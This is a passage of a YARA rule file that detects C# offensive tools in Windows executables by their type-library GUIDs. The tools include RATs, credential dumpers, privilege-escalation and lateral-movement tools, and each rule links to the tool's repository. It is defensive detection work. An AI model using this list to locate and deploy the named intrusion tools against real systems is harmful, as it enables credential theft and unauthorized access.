\"5decaea3-2610-4065-99dc-65b9b4ba6ccd\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CasperStager {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ustayready/CasperStager\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"c653a9f2-0939-43c8-9b93-fed5e2e4c7e6\" ascii nocase wide\n        $typelibguid1 = \"48dfc55e-6ae5-4a36-abef-14bc09d7510b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_TellMeYourSecrets {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xbadjuju/TellMeYourSecrets\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"9b448062-7219-4d82-9a0a-e784c4b3aa27\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpExcel4_DCOM {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rvrsh3ll/SharpExcel4-DCOM\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"68b83ce5-bbd9-4ee3-b1cc-5e9223fab52b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpShooter {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mdsecactivebreach/SharpShooter\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"56598f1c-6d88-4994-a392-af337abe5777\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_NoMSBuild {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rvrsh3ll/NoMSBuild\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"034a7b9f-18df-45da-b870-0e1cef500215\" ascii nocase wide\n        $typelibguid1 = \"59b449d7-c1e8-4f47-80b8-7375178961db\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_TeleShadow2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ParsingTeam/TeleShadow2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"42c5c356-39cf-4c07-96df-ebb0ccf78ca4\" ascii nocase wide\n        $typelibguid1 = \"0242b5b1-4d26-413e-8c8c-13b4ed30d510\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_BadPotato {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/BeichenDream/BadPotato\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"0527a14f-1591-4d94-943e-d6d784a50549\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_LethalHTA {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/codewhitesec/LethalHTA\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"784cde17-ff0f-4e43-911a-19119e89c43f\" ascii nocase wide\n        $typelibguid1 = \"7e2de2c0-61dc-43ab-a0ec-c27ee2172ea6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpStat {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Raikia/SharpStat\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"ffc5c721-49c8-448d-8ff4-2e3a7b7cc383\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SneakyService {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/malcomvetter/SneakyService\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"897819d5-58e0-46a0-8e1a-91ea6a269d84\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpExec {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/anthemtotheego/SharpExec\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"7fbad126-e21c-4c4e-a9f0-613fcf585a71\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpCOM {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rvrsh3ll/SharpCOM\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"51960f7d-76fe-499f-afbd-acabd7ba50d1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Inception {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/two06/Inception\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"03d96b8c-efd1-44a9-8db2-0b74db5d247a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_sharpwmi {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/QAX-A-Team/sharpwmi\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"bb357d38-6dc1-4f20-a54c-d664bd20677e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CVE_2019_1064 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/RythmStick/CVE-2019-1064\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"ff97e98a-635e-4ea9-b2d0-1a13f6bdbc38\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Tokenvator {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xbadjuju/Tokenvator\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"4b2b3bd4-d28f-44cc-96b3-4a2f64213109\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_WheresMyImplant {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xbadjuju/WheresMyImplant\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"cca59e4e-ce4d-40fc-965f-34560330c7e6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Naga {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/byt3bl33d3r/Naga\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"99428732-4979-47b6-a323-0bb7d6d07c95\" ascii nocase wide\n        $typelibguid1 = \"a2c9488f-6067-4b17-8c6f-2d464e65c535\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpBox {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/P1CKLES/SharpBox\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"616c1afb-2944-42ed-9951-bf435cadb600\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_rundotnetdll32 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xbadjuju/rundotnetdll32\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"a766db28-94b6-4ed1-aef9-5200bbdd8ca7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AntiDebug {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/malcomvetter/AntiDebug\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"997265c1-1342-4d44-aded-67964a32f859\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DInvisibleRegistry {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NVISO-BE/DInvisibleRegistry\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"31d576fb-9fb9-455e-ab02-c78981634c65\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_TikiTorch {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/TikiTorch\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"806c6c72-4adc-43d9-b028-6872fa48d334\" ascii nocase wide\n        $typelibguid1 = \"2ef9d8f7-6b77-4b75-822b-6a53a922c30f\" ascii nocase wide\n        $typelibguid2 = \"8f5f3a95-f05c-4dce-8bc3-d0a0d4153db6\" ascii nocase wide\n        $typelibguid3 = \"1f707405-9708-4a34-a809-2c62b84d4f0a\" ascii nocase wide\n        $typelibguid4 = \"97421325-b6d8-49e5-adf0-e2126abc17ee\" ascii nocase wide\n        $typelibguid5 = \"06c247da-e2e1-47f3-bc3c-da0838a6df1f\" ascii nocase wide\n        $typelibguid6 = \"fc700ac6-5182-421f-8853-0ad18cdbeb39\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_HiveJack {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Viralmaniar/HiveJack\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"e12e62fe-bea3-4989-bf04-6f76028623e3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DecryptAutoLogon {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/securesean/DecryptAutoLogon\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"015a37fc-53d0-499b-bffe-ab88c5086040\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_UnstoppableService {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/malcomvetter/UnstoppableService\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"0c117ee5-2a21-dead-beef-8cc7f0caaa86\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpWMI {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/SharpWMI\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"6dd22880-dac5-4b4d-9c91-8c35cc7b8180\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_EWSToolkit {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/EWSToolkit\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"ca536d67-53c9-43b5-8bc8-9a05fdc567ed\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SweetPotato {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/CCob/SweetPotato\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"6aeb5004-6093-4c23-aeae-911d64cacc58\" ascii nocase wide\n        $typelibguid1 = \"1bf9c10f-6f89-4520-9d2e-aaf17d17ba5e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_memscan {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/nccgroup/memscan\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"79462f87-8418-4834-9356-8c11e44ce189\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpStay {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xthirteen/SharpStay\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"2963c954-7b1e-47f5-b4fa-2fc1f0d56aea\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpLocker {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Pickfordmatt/SharpLocker\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"a6f8500f-68bc-4efc-962a-6c6e68d893af\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SauronEye {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/vivami/SauronEye\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"0f43043d-8957-4ade-a0f4-25c1122e8118\" ascii nocase wide\n        $typelibguid1 = \"086bf0ca-f1e4-4e8f-9040-a8c37a49fa26\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_sitrep {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mdsecactivebreach/sitrep\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"12963497-988f-46c0-9212-28b4b2b1831b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpClipboard {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/slyd0g/SharpClipboard\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"97484211-4726-4129-86aa-ae01d17690be\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpCookieMonster {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/m0rv4i/SharpCookieMonster\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"566c5556-1204-4db9-9dc8-a24091baaa8e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_p0wnedShell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Cn33liz/p0wnedShell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"2e9b1462-f47c-48ca-9d85-004493892381\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpMove {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xthirteen/SharpMove\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"8bf82bbe-909c-4777-a2fc-ea7c070ff43e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_C_Sharp_R_A_T_Client {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/AdvancedHacker101/C-Sharp-R.A.T-Client\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"6d9e8852-e86c-4e36-9cb4-b3c3853ed6b8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpPrinter {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rvrsh3ll/SharpPrinter\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"41b2d1e5-4c5d-444c-aa47-629955401ed9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_EvilFOCA {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ElevenPaths/EvilFOCA\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"f26bdb4a-5846-4bec-8f52-3c39d32df495\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_PoshC2_Misc {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/nettitude/PoshC2_Misc\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"85773eb7-b159-45fe-96cd-11bad51da6de\" ascii nocase wide\n        $typelibguid1 = \"9d32ad59-4093-420d-b45c-5fff391e990d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Sharpire {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xbadjuju/Sharpire\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"39b75120-07fe-4833-a02e-579ff8b68331\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Sharp_SMBExec {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/checkymander/Sharp-SMBExec\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"344ee55a-4e32-46f2-a003-69ad52b55945\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_MiscTools {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/MiscTools\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"384e9647-28a9-4835-8fa7-2472b1acedc0\" ascii nocase wide\n        $typelibguid1 = \"d7ec0ef5-157c-4533-bbcd-0fe070fbf8d9\" ascii nocase wide\n        $typelibguid2 = \"10085d98-48b9-42a8-b15b-cb27a243761b\" ascii nocase wide\n        $typelibguid3 = \"6aacd159-f4e7-4632-bad1-2ae8526a9633\" ascii nocase wide\n        $typelibguid4 = \"49a6719e-11a8-46e6-ad7a-1db1be9fea37\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_MemoryMapper {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jasondrawdy/MemoryMapper\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"b9fbf3ac-05d8-4cd5-9694-b224d4e6c0ea\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_VanillaRAT {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/DannyTheSloth/VanillaRAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"d0f2ee67-0a50-423d-bfe6-845da892a2db\" ascii nocase wide\n        $typelibguid1 = \"a593fcd2-c8ab-45f6-9aeb-8ab5e20ab402\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_UnmanagedPowerShell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/leechristensen/UnmanagedPowerShell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"dfc4eebb-7384-4db5-9bad-257203029bd9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Quasar {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/quasar/Quasar\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"cfda6d2e-8ab3-4349-b89a-33e1f0dab32b\" ascii nocase wide\n        $typelibguid1 = \"c7c363ba-e5b6-4e18-9224-39bc8da73172\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpAdidnsdump {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/b4rtik/SharpAdidnsdump\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"cdb02bc2-5f62-4c8a-af69-acc3ab82e741\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DotNetToJScript {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tyranid/DotNetToJScript\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"7e3f231c-0d0b-4025-812c-0ef099404861\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Inferno {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/LimerBoy/Inferno\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"26d498f7-37ae-476c-97b0-3761e3a919f0\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpSearch {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/djhohnstein/SharpSearch\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"98fee742-8410-4f20-8b2d-d7d789ab003d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpSecDump {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/G0ldenGunSec/SharpSecDump\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"e2fdd6cc-9886-456c-9021-ee2c47cf67b7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Net_GPPPassword {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/outflanknl/Net-GPPPassword\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"00fcf72c-d148-4dd0-9ca4-0181c4bd55c3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_FileSearcher {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NVISO-BE/FileSearcher\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"2c879479-5027-4ce9-aaac-084db0e6d630\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ADFSDump {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/fireeye/ADFSDump\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"9ee27d63-6ac9-4037-860b-44e91bae7f0d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpRDP {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xthirteen/SharpRDP\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"f1df1d0f-ff86-4106-97a8-f95aaf525c54\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpCall {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jhalon/SharpCall\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"c1b0a923-0f17-4bc8-ba0f-c87aff43e799\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ysoserial_net {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/pwntester/ysoserial.net\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"e1e8c029-f7cd-4bd1-952e-e819b41520f0\" ascii nocase wide\n        $typelibguid1 = \"6b40fde7-14ea-4f57-8b7b-cc2eb4a25e6c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of 